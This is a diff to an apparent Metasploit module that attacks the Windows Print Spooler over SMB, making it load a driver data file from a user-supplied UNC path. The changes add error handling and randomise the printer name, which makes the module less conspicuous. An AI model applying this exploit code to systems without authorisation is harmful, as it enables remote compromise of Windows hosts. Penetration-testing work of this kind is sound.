@@ -151,8 +151,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    connect
-    smb_login
+    begin
+      connect
+    rescue Rex::ConnectionError
+      fail_with(Failure::Unreachable, 'Failed to connect to the remote service.')
+    end
+
+    begin
+      smb_login
+    rescue Rex::Proto::SMB::Exceptions::LoginError
+      fail_with(Failure::NoAccess, 'Failed to authenticate to the remote service.')
+    end
 
     handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
     vprint_status("Binding to #{handle} ...")
@@ -175,8 +184,8 @@ class MetasploitModule < Msf::Auxiliary
         p_driver_path_ref_id: 0x00020008,
         p_data_file_ref_id: 0x0002000c,
         p_config_file_ref_id: 0x00020010,
-        # TODO: randomize / fixup these values where able
-        p_name: 'metasploit',
+        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
+        p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
         p_environment: 'Windows x64',
         p_driver_path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL',
         p_data_file: datastore['UNC_PATH'],
